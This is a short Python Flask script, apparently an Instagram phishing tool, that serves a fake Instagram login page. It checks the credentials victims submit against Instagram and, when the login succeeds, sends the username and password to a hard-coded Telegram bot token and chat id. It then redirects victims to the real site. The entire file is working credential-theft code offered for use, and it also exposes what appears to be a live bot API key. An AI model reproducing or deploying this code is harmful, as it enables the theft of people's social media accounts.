#!/usr/bin/env python
# """
#  ______   _______  _______  _        _______  _______  _______ 
# (  __  \ (  ____ \(  ____ \| \    /\(  ____ )(  ___  )(  ___  )
# | (  \  )| (    \/| (    \/|  \  / /| (    )|| (   ) || () () |
# | |   ) || (__    | (_____ |  (_/ / | (____)|| (___) || || || |
# | |   | ||  __)   (_____  )|   _ (  |     __)|  ___  || |(_)| |
# | |   ) || (            ) ||  ( \ \ | (\ (   | (   ) || |   | |===>("Ali")
# | (__/  )| (____/\/\____) ||  /  \ \| ) \ \__| )   ( || )   ( |
# (______/ (_______/\_______)|_/    \/|/   \__/|/     \||/     \|
# """         ___                  
# User --- > <(-_-)> Attcker --> :) 
# [+] Tool Face Instgram Page! 

import requests
from flask import Flask, request, render_template, jsonify
from check.instagram_login import InstagramLogin
from flask_cors import CORS

app = Flask(__name__)

# Configure CORS
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

instagram_login = InstagramLogin(app)

@app.route('/', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        data = request.json
        if data:
            username = data['username']
            password = data['password']
            if username and password:
                response = instagram_login.login(username, password)
                
                if response.ok:
                    if 'authenticated":true' in response.text or "userId" in response.text:
                        send_telegram_message(username, password)
                        return jsonify({'success': True, 'redirect_url': 'http://www.instagram.com/', 'message': 'Login successful!'})
                    else:
                        return jsonify({'success': False, 'message': 'Sorry, your password was incorrect. Please double-check your password.'})
                else:
                    return jsonify({'success': False, 'message': "We couldn't connect to Instagram. Make sure you're connected to the internet and try again."})

    return render_template('login.html', error=None)

def send_telegram_message(username, password):
    bot_api_key = '5609501351:AAHe5N3Su7K_hu5BjP9M0S6b6Pfvu6yQtj8'
    chat_id = '5645434088'
    message = f'Username: {username}, Password: {password}'
    telegram_url = f'https://api.telegram.org/bot{bot_api_key}/sendMessage?chat_id={chat_id}&text={message}'
    requests.get(telegram_url)

if __name__ == '__main__':
    app.run(debug=False)
